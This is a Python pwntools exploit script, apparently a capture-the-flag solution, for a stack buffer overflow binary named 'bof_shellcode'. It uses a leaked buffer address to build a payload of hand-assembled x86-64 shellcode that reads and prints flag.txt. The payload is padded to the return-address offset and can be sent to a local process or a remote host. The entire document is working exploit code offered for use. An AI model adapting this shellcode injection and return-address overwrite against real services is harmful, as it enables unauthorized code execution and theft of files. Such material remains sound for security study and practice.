from pwn import *
import time
import sys


def exploit():
    raw_input('wait')
    proc.recvuntil('buffer address: ')
    overflowme_adr = int(proc.recvline(), 16)
    print hex(overflowme_adr)
    raw_input('wait')

    # generate by pflag.asm
    shellcode = '\xeb\x3f\x5f\x80\x77\x08\x41\x48\x31\xc0\x04\x02\x48\x31\xf6'
    shellcode += '\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48'
    shellcode += '\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40'
    shellcode += '\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31'
    shellcode += '\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x66\x6c\x61\x67\x2e'
    shellcode += '\x74\x78\x74\x41'

    buf = shellcode
    buf += 'A' * (cyclic_find('jaab') - len(buf))
    buf += p64(overflowme_adr)
    proc.sendline(buf)


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc localhost port'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./bof_shellcode'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
